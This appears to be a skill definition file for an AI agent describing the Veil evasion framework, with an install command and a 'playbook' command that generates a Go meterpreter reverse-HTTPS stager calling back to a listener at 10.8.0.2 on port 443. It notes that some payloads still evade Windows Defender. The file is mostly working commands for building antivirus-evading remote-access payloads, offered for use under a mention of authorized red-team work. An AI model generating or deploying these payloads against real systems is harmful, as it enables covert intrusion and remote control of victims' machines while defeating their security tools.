---
name: veil-framework
description: "Veil: Evasion payload generation. Signals: malware development, evasion development, menu, list payloads, interactive selection."
zh-signals: "Veil: 免杀载荷生成。信号:恶意软件开发,免杀开发,菜单,列 payload,交互选择。"
when-to-use: >-
  Use when generating AV-evading payloads for authorized red-team engagements and you need
  Python, Go, or C stagers via an interactive menu.
---

# Veil

- Attack Category: C45 Malware Development and AV Evasion
- Upstream Repository: https://github.com/Veil-Framework/Veil
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Veil-Framework/Veil && cd Veil && ./config/setup.sh --force --silent
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./Veil.py` | Menu |
| `./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost x --lport 443 -o payload` | Generate |
| `list` | List payloads |
| `use 1` | Interactive selection |

## Attack Scenario Playbook

### AV-evading payload generation

```bash
./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost 10.8.0.2 --lport 443 -o agent
# Go/Python/C multi-language payloads, some still evade Windows Defender
```

## Notes

Long-standing AV evasion framework generating Python/Go/C payloads; the actual evasion rate must be tested in a current EDR environment.
